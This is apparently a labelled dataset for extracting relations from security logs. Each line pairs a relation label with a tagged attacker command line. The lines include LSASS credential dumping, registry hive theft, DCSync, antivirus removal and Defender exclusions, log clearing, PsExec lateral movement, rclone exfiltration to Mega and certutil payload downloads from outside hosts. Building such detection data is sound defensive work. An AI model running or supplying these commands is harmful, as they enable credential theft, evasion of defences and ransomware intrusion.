process-file-read(e1,e2)	<e1>reg_93.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>ping</e2> http://<IP redacted>
process-process-unlink(e1,e2)	<e1>taskkill</e1> /f /im <e2>360safe.exe</e2>
process-file-write(e1,e2)	"cmd.exe /C netsh advfirewall firewall add rule dir=in name =""WMI"" <e1>program=C:\Windows\system32\svchost.exe</e1> service=winmgmt action = allow protocol=TCP localport=any > <e2>C:\Windows\Temp\XsssmLZZ.tmp</e2> 2>&1"
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""Sophos System Protection"" call uninstall /nointeractive"
process-file-chmod(e1,e2)	cmd.exe <e1>icacls</e1> <e2>/tmp/malware.sh</e2> /grant Everyone:F
process-process-inject(e1,e2)	rundll32.exe <e1>dllinjector.exe</e1> -p <e2>lsass.exe</e2> -d payload.dll
process-file-exec(e1,e2)	<e1>rundll32.exe</e1> <e2>locker.dll</e2> ,run /TARGET=\\HOST1.DOMAIN.NAME\C$
process-file-write(e1,e2)	<e1>mshta_60.exe</e1> -write <e2>C:\Users\Public\hta_payload_60.hta</e2>
process-socket-send(e1,e2)	"<e1>PsExec.exe</e1> -d <e2>\\HOST</e2> -u ""DOMAIN\USER"" -p ""PASSWORD"" -accepteula -s cmd /c ""powershell.exe -ExecutionPolicy Bypass -file \\DOMAINCONTROLLER\share$\p.ps1"""
process-file-write(e1,e2)	"<e1>af.exe</e1> -f ""(objectcategory=person)"" > <e2>ad_users.txt</e2>"
process-file-read(e1,e2)	<e1>7z_91.exe</e1> x <e2>C:\Users\Public\archive_91.7z</e2> -so > nul
process-file-exec(e1,e2)	"<e1>regsvr32.exe</e1> /s /n /i <e2>""C:\ProgramData\31765.ocx""</e2>"
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>Remove-Item</e2> C:\ProgramData\updater.exe -Force
process-process-unlink(e1,e2)	<e1>powershell.exe</e1> Stop-Process -Name <e2>taskmgr.exe</e2> -Force
process-file-write(e1,e2)	"cmd /v /c <e1>net</e1> group /domain ""Domain Admins"" > <e2>""%TEMP%\51362.txt""</e2> 2>&1"
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>taskkill</e2> /IM lsass.exe /F
process-file-write(e1,e2)	<e1>certutil.exe</e1> -urlcache -split -f https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 <e2>powershellintelmodule.ps1</e2>
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>icacls</e2> /var/tmp/hide.so /grant Everyone:F
process-file-read(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>C:\Windows\Temp\adf\anchorAsjuster_x64.exe</e1> <e2>--source=anchorDNS_x64.exe</e2> --target=anchor_x64.exe --domain=xyskencevli.com,sluaknhbsoe.com --period=2 --lasthope=2 -guid
process-file-unlink(e1,e2)	cmd.exe <e1>del</e1> <e2>C:\Users\Public\runme.bat</e2>
process-file-write(e1,e2)	"<e1>powershell_96.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_96.ps1',</e2> 'Invoke-Mimikatz')"""
process-file-exec(e1,e2)	<e1>wmic.exe</e1> /c start <e2>/var/tmp/hide.so</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C for /f %i in (C:\ProgramData\servers.txt) do <e2>ping</e2> -n 1 %i -v 4 | find /I TTL >> C:\ProgramData\servers_live.txt
process-file-read(e1,e2)	<e1>certutil_93.exe</e1> -encode <e2>input_93.txt</e2> C:\temp\encoded_93.txt
process-socket-receive(e1,e2)	<e1>certutil_59.exe</e1> -urlcache -split -f <e2>http://malicious.site/data_59.enc</e2> C:\Temp\temp_59.enc
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>attrib</e2> +s +h C:\Windows\Temp\evil.dll
process-file-write(e1,e2)	"<e1>C:\Windows\system32\reg.exe</e1> ADD <e2>""HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths""</e2> /f /t REG_DWORD /v ""C:\ProgramData\Microsoft\Oweboiqnb"" /d ""0"""
process-file-write(e1,e2)	<e1>procdump.exe</e1> -accepteula -ma lsass.exe <e2>mem.dmp</e2>
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""Symantec Backup Exec Remote Agent for Windows"" call uninstall /nointeractive"
process-file-exec(e1,e2)	"<e1>rundll32</e1> <e2>""%temp%\magni.w"",</e2> scab \k arabika752"
process-file-unlink(e1,e2)	python.exe <e1>Remove-Item</e1> <e2>/tmp/malware.sh</e2> -Force
process-file-unlink(e1,e2)	svchost.exe <e1>del</e1> <e2>/usr/local/bin/backdoor</e2>
process-file-read(e1,e2)	"wmic /node:""TARGET_HOST_IP"" /user:""DOMAIN\USER"" /password:""PASSWORD"" process call create <e1>""cmd.exe</e1> /c copy <e2>\\SOURCE_SERVER_IP\c\windows\temp\p.bat</e2> c:\windows\temp"""
process-file-write(e1,e2)	<e1>adfind.exe</e1> -sc adinfo > <e2>adinfo.txt</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> /c start <e2>powershell.exe</e2>
process-process-inject(e1,e2)	<e1>powershell.exe</e1> Set-ProcessInjection -Target <e2>explorer.exe</e2>
process-file-exec(e1,e2)	<e1>cmd.exe</e1> /c <e2>%USERPROFILE%\AppData\bigfile.exe</e2> -i -c %USERPROFILE%\AppData\1.bat
process-file-read(e1,e2)	"<e1>rundll32.exe</e1> <e2>""C:\Users\REDACTED\AppData\Local\Temp\rate_x32.dat""</e2> ,update /i:""LaborBetray\license.dat"""
process-file-read(e1,e2)	<e1>ftp_67.exe</e1> <e2>-s:script_67.txt</e2> C:\inetpub\wwwroot\ftp_67.log
process-process-fork(e1,e2)	"<e1>schtasks.exe</e1> /Create /RU ""NT AUTHORITY\SYSTEM"" /tn juqpxmakfk /tr <e2>""regsvr32.exe</e2> -s C:\Users\REDACTED\ocrafh.html"" /SC ONCE /Z /ST 14:20 /ET 14:32"
process-process-fork(e1,e2)	"<e1>reg.exe</e1> add hkcu\software\classes\ms-settings\shell\open\command /ve /d <e2>""reg.exe</e2> save hklm\sam c:\ProgramData\sam.save"" /f"
process-socket-receive(e1,e2)	<e1>lsadump::dcsync</e1> <e2>/domain:CHILD.DOMAIN.EXAMPLE</e2> /user:DOMAINADMINUSER /csv > CHILD.csv
process-file-read(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C for /f %i in <e2>(C:\ProgramData\servers.txt)</e2> do ping -n 1 %i -v 4 | find /I TTL >> C:\ProgramData\servers_live.txt
process-file-exec(e1,e2)	psexec.exe -accepteula -d -s \\<INTERNAL_IP> <e1>rundll32.exe</e1> <e2>C:\windows\192145.dll,StartW</e2>
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeamfilesysvsssvc.exe</e2> /F
process-socket-receive(e1,e2)	"<e1>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</e1> -Command <e2>""(New-Object Net.WebClient).DownloadFile('http://msa.org.in/app/webroot/js/kcfinder/js/AdFind.bin',</e2> 'c:\Users\Public\adfind.exe'"
process-file-read(e1,e2)	<e1>WMIC</e1> /Node:localhost <e2>/Namespace:\\root\SecurityCenter2</e2> Path AntiVirusProduct Get * /Format:Listc
process-process-fork(e1,e2)	"<e1>PsExec.exe</e1> /accepteula -d \\REDACTED -u ""domain.local\Administrator"" -p ""REDACTED"" <e2>cmd</e2> /c COPY /Y ""\\REDACTED\share$\ds.exe"" ""%PUBLIC%\Music"""
process-socket-send(e1,e2)	cmd.exe /C <e1>net</e1> view \\<e2>DOMAINCONTROLLER</e2> /all
process-socket-receive(e1,e2)	wmic.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>https://evil.server/payload</e2>
process-socket-receive(e1,e2)	powershell.exe <e1>python3</e1> -m http.server 8080 --bind <e2>https://evil.server/payload</e2>
process-file-write(e1,e2)	<e1>schtasks.exe</e1> /Create /F /XML <e2>C:\windows\temp\Wininet.xml</e2> /tn '\Microsoft\Windows\Maintenance\Wininet'
process-process-inject(e1,e2)	<e1>cmd.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>taskmgr.exe</e2>
process-socket-send(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <e2><backup server></e2> --port 9401 --cmd ""c:\windows\notepad.exe"" --sql ""EXEC master..xp\_cmdshell 'net localgroup administrators sqlbackup /add'"""
process-socket-receive(e1,e2)	powershell.exe <e1>python3</e1> -m http.server 8080 --bind <e2>10.10.10.10:4444</e2>
process-file-read(e1,e2)	<e1>nuclei</e1> -l <e2>telco_again_subfinder</e2> -o telco_again_subfinder_nuclei_scan -as
process-file-unlink(e1,e2)	powershell.exe <e1>del</e1> <e2>C:\ProgramData\updater.exe</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C for /f %%i in (C:\ProgramData\servers_live.txt) do <e2>dir</e2> \\%%i\C$ >> C:\ProgramData\servers_live_dir.txt
process-file-unlink(e1,e2)	python.exe <e1>rm</e1> <e2>C:\Users\Public\runme.bat</e2>
process-socket-send(e1,e2)	<e1>psexec.exe</e1> -accepteula -d -s <e2>\\<INTERNAL_IP></e2> rundll32.exe C:\windows\192145.dll ,StartW
process-file-exec(e1,e2)	<e1>schtasks</e1> /create /I 1 /TR <e2>C:WindowsTempUpdate.exe</e2> /TN UpdateEdge /SC ONIDLE
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""McAfee Agent""</e2> call uninstall /nointeractive"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>taskkill</e2> /IM explorer.exe /F
process-file-read(e1,e2)	"<e1>%WINDIR%\system32\cmd.exe</e1> /c <e2>""C:\share$\WMI1.bat""</e2>"
process-socket-send(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>cool.exe</e1> <e2>[DC IP ADDRESS]</e2> [DOMAIN NAME] Administrator -c ""taskkill /f /im explorer.exe"""
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>taskkill</e2> /IM notepad.exe /F
Other	rundll32.exe <e1>locker.dll</e1> ,run <e2>/TARGET=\\HOST1.DOMAIN.NAME\C$</e2>
process-file-read(e1,e2)	<e1>wscript_7.exe</e1> readAll <e2>C:\inetpub\wwwroot\web_7.config</e2>
process-file-read(e1,e2)	"<e1>powershell_69.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_69.yaml""</e2>"
process-file-chmod(e1,e2)	python.exe <e1>attrib</e1> +s +h <e2>/var/tmp/hide.so</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>del</e2> /var/tmp/hide.so
process-file-write(e1,e2)	<e1>adfind.exe</e1> -f (objectcategory=person) > <e2>ad_users.txt</e2>
process-file-write(e1,e2)	cmd_35.exe /c <e1>echo</e1> malicious > <e2>C:\Temp\evil_35.bat</e2>
process-process-unlink(e1,e2)	powershell.exe <e1>taskkill</e1> /IM <e2>explorer.exe</e2> /F
process-file-chmod(e1,e2)	svchost.exe <e1>chmod</e1> 777 <e2>/var/tmp/hide.so</e2>
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.backup.mountservice.exe</e2> /F
process-process-unlink(e1,e2)	<e1>python.exe</e1> Stop-Process -Name <e2>explorer.exe</e2> -Force
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>attrib</e2> +s +h /var/tmp/hide.so
process-file-read(e1,e2)	<e1>%PUBLIC%\Music\SETUP.bat</e1> <e2>%PUBLIC%\Music\COPY.bat</e2>
process-file-write(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C af.exe -f ""(objectcategory=person)"" > <e2>ad_users.txt</e2>"
process-file-exec(e1,e2)	<e1>svchost.exe</e1> -exec <e2>/tmp/malware.sh</e2>
process-process-unlink(e1,e2)	<e1>wmic.exe</e1> Stop-Process -Name <e2>explorer.exe</e2> -Force
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>sqlwriter.exe</e2> /F
process-file-write(e1,e2)	cmd.exe /Q /c <e1>cmdkey</e1> /list 1> <e2>\\127.0.0.1\ADMIN$\__REDACTED</e2> 2>&1
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> /c start <e2>powershell.exe</e2>
process-file-write(e1,e2)	<e1>net</e1> localgroup <e2>Administrators</e2> sql_admin /ADD
process-process-unlink(e1,e2)	wmic.exe <e1>taskkill</e1> /IM <e2>explorer.exe</e2> /F
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>attrib</e2> +S +H %appdata%\Microsoft\Network\python-3.10.4-embed-amd64.zip
process-socket-send(e1,e2)	<e1>WMIC</e1> <e2>/Node\:localhost</e2> /Namespace:\\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format\:List
process-process-fork(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>wmic</e1> /node:<REDACTED> process call create <e2>""cmd</e2> /C > C:\ProgramData\1.txt 2>&1 reg query HKEY_USERS\<SID>\Network"""
process-socket-send(e1,e2)	<e1>ping</e1> -n 1 <e2>hostname</e2> >> C:\programdata\log.txt
process-file-write(e1,e2)	"<e1>powershell_89.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_89.ps1',</e2> 'Invoke-Mimikatz')"""
process-file-unlink(e1,e2)	wmic.exe <e1>rm</e1> <e2>C:\Windows\Temp\evil.dll</e2>
process-process-unlink(e1,e2)	"<e1>C:\Windows\system32\net1</e1> stop <e2>""veeamcloudsvc""</e2> /y"
process-file-write(e1,e2)	"<e1>net</e1> localgroup <e2>""administrator""</e2> (comment: command mistyped)"
process-process-fork(e1,e2)	"PsExec.exe -d \\HOST -u ""DOMAIN\USER"" -p ""PASSWORD"" -accepteula -s <e1>cmd</e1> /c <e2>""powershell.exe</e2> -ExecutionPolicy Bypass -file \\DOMAINCONTROLLER\share$\p.ps1"""
process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\servers_live.txt) do <e1>net</e1> view \\%i /all >> <e2>C:\ProgramData\servers_live_netview.txt</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>reg.exe</e2> save hklm\security c:\ProgramData\security.save
process-file-unlink(e1,e2)	svchost.exe <e1>rm</e1> <e2>C:\Windows\Temp\evil.dll</e2>
process-file-exec(e1,e2)	<e1>python.exe</e1> -exec <e2>C:\Windows\Temp\evil.dll</e2>
process-file-write(e1,e2)	cmd_61.exe /c <e1>echo</e1> %USERNAME% >> <e2>C:\output\users_61.txt</e2>
process-process-fork(e1,e2)	<e1>adfind.exe</e1> -f (objectcategory=person) > <e2>ad_users.txt</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C for /f %i in (C:\ProgramData\servers_live.txt) do <e2>net</e2> view \\%i /all >> C:\ProgramData\servers_live_netview.txt
process-process-fork(e1,e2)	<e1>wmic.exe</e1> runas /user:admin <e2>rundll32.exe</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>echo</e2> btc1000qwe123 | C:\ProgramData\Any\AnyDesk.exe --set-password
process-file-read(e1,e2)	"<e1>net</e1> group <e2>""domain admins""</e2> /domainsysteminfo"
process-file-read(e1,e2)	<e1>adfind.exe</e1> -f (objectcategory=person) > <e2>ad_users.txt</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> /c start <e2>powershell.exe</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>rundll32.exe</e2> C:\ProgramData\n23.dll,AddProgram
process-file-read(e1,e2)	python.exe <e1>dllinjector.exe</e1> -p notepad.exe -d <e2>payload.dll</e2>
process-file-read(e1,e2)	<e1>certutil_81.exe</e1> -urlcache -split -f http://malicious.site/data_81.enc <e2>C:\Temp\temp_81.enc</e2>
process-file-exec(e1,e2)	<e1>powershell.exe</e1> Uninstall-WindowsFeature -Name <e2>Windows-Defender-GUI</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>wmic</e2> /namespace:\\root\SecurityCenter2 PATH AntiSpywareProduct GET /value
process-file-write(e1,e2)	<e1>adfind.exe</e1> -sc domainlist > <e2>domainlist.txt</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>ping</e2> WORKSTATION
process-file-exec(e1,e2)	"<e1>schtasks</e1> /create /tn ngm /tr <e2>""%~dps0kit.bat</e2> -s"" /sc hourly /ru"
process-file-write(e1,e2)	"<e1>""C:\Program Files\WinRAR\WinRAR.exe""</e1> a -ep1 -scul -r0 -iext   -imon1 -- . <e2>G:\REDACTED</e2>"
process-file-write(e1,e2)	<e1>ftp_87.exe</e1> -s:script_87.txt <e2>C:\inetpub\wwwroot\ftp_87.log</e2>
process-file-exec(e1,e2)	<e1>powershell.exe</e1> /c start <e2>/tmp/malware.sh</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>dllinjector.exe</e2> -p winlogon.exe -d payload.dll
process-file-read(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c cd <e2>%appdata%\Microsoft\Network</e2> && powershell Expand-Archive python-3.10.4-embed-amd64.zip -DestinationPath %appdata%\Microsoft\Network
process-process-inject(e1,e2)	<e1>powershell.exe</e1> Set-ProcessInjection -Target <e2>svchost.exe</e2>
process-process-unlink(e1,e2)	<e1>net</e1> stop <e2>BackupExecVSSProvider</e2> /y
process-file-read(e1,e2)	C:\Windows\system32\cmd.exe /c cd %appdata%\Microsoft\Network && <e1>powershell</e1> Expand-Archive <e2>python-3.10.4-embed-amd64.zip</e2> -DestinationPath %appdata%\Microsoft\Network
process-file-chmod(e1,e2)	rundll32.exe <e1>icacls</e1> <e2>/var/tmp/hide.so</e2> /grant Everyone:F
process-file-unlink(e1,e2)	cmd.exe /c <e1>wevtutil</e1> cl <e2>application4</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>echo</e2> a3fed5b3a32 > \\.\pipe\3406c2
process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>adfind.exe</e1> -sc trustdmp > <e2>trustdmp.txt</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>wevtutil</e2> cl security
process-file-exec(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>C:\Users\USER\Desktop\info\start.bat</e2>
process-socket-send(e1,e2)	<e1>WMIC</e1> /Node\:localhost <e2>/Namespace:\\\root\SecurityCenter2</e2> Path AntiVirusProduct Get displayName /Format\:List
process-file-write(e1,e2)	<e1>certutil_27.exe</e1> -encode input_27.txt <e2>C:\temp\encoded_27.txt</e2>
process-file-write(e1,e2)	"<e1>powershell_72.exe</e1> -Command ""Set-Content -Path <e2>C:\Windows\Temp\log_72.txt</e2> -Value 'infected'"""
process-file-chmod(e1,e2)	cmd.exe <e1>attrib</e1> +s +h <e2>C:\ProgramData\updater.exe</e2>
process-process-fork(e1,e2)	"<e1>PsExec.exe</e1> -d \\HOST -u ""DOMAIN\USER"" -p ""PASSWORD"" -accepteula -s <e2>cmd</e2> /c ""powershell.exe -ExecutionPolicy Bypass -file \\DOMAINCONTROLLER\share$\p.ps1"""
process-process-fork(e1,e2)	<e1>svchost.exe</e1> /c start <e2>cmd.exe</e2>
process-process-fork(e1,e2)	<e1>cmd_45.exe</e1> /c <e2>echo</e2> %USERNAME% >> C:\output\users_45.txt
process-file-exec(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>C:\\Users\\info\\start.bat</e2>
process-file-write(e1,e2)	<e1>nuclei</e1> -l sept24.txt -o <e2>sept24_op.txt</e2> -s critical,high
process-file-write(e1,e2)	<e1>mshta_86.exe</e1> -write <e2>C:\Users\Public\hta_payload_86.hta</e2>
process-socket-send(e1,e2)	<e1>cmd.exe</e1> /c echo wafrms > <e2>\\.\pipe\wafrms</e2>
process-file-write(e1,e2)	"schtasks /create /RL HIGHEST /RU ""NT AUTHORITY\SYSTEM"" /sc minute /mo 30 /tn ""schdsWin"" /tr ""cmd.exe /C <e1>certutil.exe</e1> -urlcache -f http://192.169.6.122:6770/svchost.exe %systemdrive%\\Windows\\Temp\\svchost.exe & <e2>%systemdrive%\\Windows\\Temp\\svchost.exe""</e2>"
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>del</e2> /usr/local/bin/backdoor
process-file-read(e1,e2)	"<e1>rclone.exe</e1> copy --max-age 2y <e2>""\\SERVER\Shares""</e2> Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M"
process-file-write(e1,e2)	<e1>7.exe</e1> a -mx3 <e2>ad.7z</e2> ad_*
process-process-unlink(e1,e2)	svchost.exe <e1>taskkill</e1> /IM <e2>notepad.exe</e2> /F
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""Microsoft Security Client"" call uninstall /nointeractive"
process-file-write(e1,e2)	"<e1>python_56.exe</e1> -c <e2>""open('C:\\Users\\admin\\payload_56.exe',</e2> 'wb').write(b'\x90\x90\x90')"""
process-file-write(e1,e2)	C:\malware\locker.exe -m - <e1>net</e1> -p <e2>\\TARGETHOST\C$</e2>
process-file-exec(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>C:\info\start.bat</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c start <e2>wmic.exe</e2>
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>icacls</e2> /tmp/malware.sh /grant Everyone:F
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>chmod</e2> 777 /tmp/malware.sh
process-socket-send(e1,e2)	<e1><num>.exe</e1> -access-token <token> -v -p <e2>\\<hostname>\scans</e2>
Other	<e1>C:\Windows\system32\cmd.exe</e1> /c cd %appdata%\Microsoft\Network && powershell -Command start <e2>script.bat</e2> -Verb RunAs
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C for /f %%i in (C:\ProgramData\servers_live.txt) do <e1>dir</e1> <e2>\\%%i\C$</e2> >> C:\ProgramData\servers_live_dir.txt
process-process-unlink(e1,e2)	"<e1>powershell.exe</e1> -Command PowerShell -Command ""{ Get-VM | where { $_.Name -ne <e2>'VM01'</e2> -and $_.Name -ne 'VM02' } | Stop-VM -Force"
process-file-read(e1,e2)	cmd.exe /C <e1>PsExec64.exe</e1> -accepteula <e2>@pc.txt</e2> -c -f -d -h 1.bat
process-file-write(e1,e2)	<e1>notepad_15.exe</e1> <e2>C:\Users\test\notes_15.txt</e2>
process-file-write(e1,e2)	cmd.exe /c <e1>C:ProgramDataAnyDesk.exe</e1> –install <e2>C:ProgramDataAnyDesk</e2> –start-with-win –silent
process-file-chmod(e1,e2)	wmic.exe <e1>icacls</e1> <e2>/tmp/malware.sh</e2> /grant Everyone:F
process-file-write(e1,e2)	<e1>ftp_92.exe</e1> -s:script_92.txt <e2>C:\inetpub\wwwroot\ftp_92.log</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>python3</e2> -m http.server 8080 --bind 192.168.1.100:8080
process-process-inject(e1,e2)	<e1>rundll32.exe</e1> dllinjector.exe -p <e2>explorer.exe</e2> -d payload.dll
process-process-inject(e1,e2)	svchost.exe <e1>dllinjector.exe</e1> -p <e2>notepad.exe</e2> -d payload.dll
process-file-chmod(e1,e2)	wmic.exe <e1>icacls</e1> <e2>C:\ProgramData\updater.exe</e2> /grant Everyone:F
process-file-exec(e1,e2)	<e1>rundll32.exe</e1> -exec <e2>C:\ProgramData\updater.exe</e2>
process-file-read(e1,e2)	"<e1>rclone.exe</e1> copy <e2>""\\[FILE SERVER]\Files""</e2> MEGA:domain -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12"
process-process-fork(e1,e2)	<e1>python.exe</e1> runas /user:admin <e2>powershell.exe</e2>
process-file-write(e1,e2)	<e1>rundll32_43.exe</e1> shell32.dll,Control_RunDLL <e2>C:\Temp\config.ini</e2>
process-process-fork(e1,e2)	<e1>%WINDIR%\system32\cmd.exe</e1> /C <e2>ping</e2> -n 1 <DOMAIN>
process-file-read(e1,e2)	%WINDIR%\system32\cmd.exe /C <e1>net</e1> user <e2>REDACTED</e2> /dom
process-file-write(e1,e2)	cmd_91.exe /c <e1>echo</e1> %USERNAME% >> <e2>C:\output\users_91.txt</e2>
process-socket-receive(e1,e2)	python.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind 10.10.10.10:4444
process-file-read(e1,e2)	<e1>7z_72.exe</e1> x <e2>C:\Users\Public\archive_72.7z</e2> -so > nul
process-file-write(e1,e2)	<e1>nuclei</e1> -l telco_again_subfinder -o <e2>telco_again_subfinder_nuclei_scan</e2> -as
process-process-fork(e1,e2)	"schtasks /create /ru SYSTEM /sc ONSTART /tn Update2 /tr <e1>""cmd</e1> /c <e2>rundll32</e2> %PUBLIC%\music\svcmc.dll, MainFunc"" schtasks /run /TN Update2"
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>Net</e2> group ""Domain Admins"" /domain \"
process-file-exec(e1,e2)	<e1>c:\windows\system32\schtasks.exe</e1> /run /tn <e2>microsoft\windows\wininet\cachetask</e2>
process-file-unlink(e1,e2)	wmic.exe <e1>del</e1> <e2>/usr/local/bin/backdoor</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>dir</e2> /s /b C:\Windows\system32\*htable.xsl
process-process-inject(e1,e2)	<e1>wmic.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>explorer.exe</e2>
Other	cmd.exe /q /c upload c:\users\<user>\documents\<doc> <e1>/home/kali/desktop/<doc></e1> 1> <e2>\\127.0.0.1\admin$\<num>.<num></e2> 2>&1
process-file-write(e1,e2)	<e1>reg.exe</e1> ADD <e2>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</e2> /v EnableLUA /t REG\_DWORD /d 0 /f
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>rundll32.exe</e2> C:\windows\System32\comsvcs.dll, MiniDump 968 C:\ProgramData\REDACTED\lsass.dmp full
process-file-read(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>dir</e1> /s *file/ <e2>Microsoft.ActiveDirectory.Management.dll</e2>
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""Malwarebytes' Managed Client"" call uninstall /nointeractive"
Other	C:\Windows\system32\cmd.exe /c cd %appdata%\Microsoft\Network && powershell Expand-Archive <e1>python-3.10.4-embed-amd64.zip</e1> -DestinationPath <e2>%appdata%\Microsoft\Network</e2>
process-socket-send(e1,e2)	<e1>restic.exe</e1> -r <e2>rest:http://195.123.226.84:8000/</e2> init --password-file ppp.txt
process-process-fork(e1,e2)	"wmic /node:""<redacted>"" process call create <e1>""cmd""</e1> /c <e2>c:\perflogs\procdump.exe</e2> -accepteula -ma lsass c:\perflogs\lsass.dmp"
process-file-write(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C af.exe -sc trustdmp > <e2>trustdmp.txt</e2>
process-file-write(e1,e2)	cmd.exe /q /c <e1>reg</e1> add <e2>hkey_local_machine\system\currentcontrolset\control\lsa</e2> /v disablerestrictedadmin /t reg_dword /d 0 1> \\127.0.0.1\admin\$\__<timestamp>\.<num> 2>&1
process-file-read(e1,e2)	rundll32.exe <e1>dllinjector.exe</e1> -p winlogon.exe -d <e2>payload.dll</e2>
